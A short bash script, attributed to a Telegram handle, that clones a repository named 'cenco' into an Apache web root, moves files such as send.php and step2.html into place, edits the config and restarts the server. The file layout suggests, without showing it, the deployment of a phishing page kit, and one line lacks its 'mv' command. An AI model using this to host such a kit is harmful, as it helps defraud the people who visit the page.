#!/bin/bash
#
# Created by: @K41S3RR - https://t.me/K41S3RR
#
# ==============================================
cd /etc/apache2/sites-available; nano 000-default.conf
cd /var/www; git clone https://github.com/resekk-vps/cenco
cd /var/www/cenco; mv index_files /var/www; mv install.sh /var/www; mv config.php /var/www; mv index.html /var/www; mv send.php /var/www; step2.html /var/www
cd /var/www; nano config.php
sudo service apache2 restart
#BANNER
clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
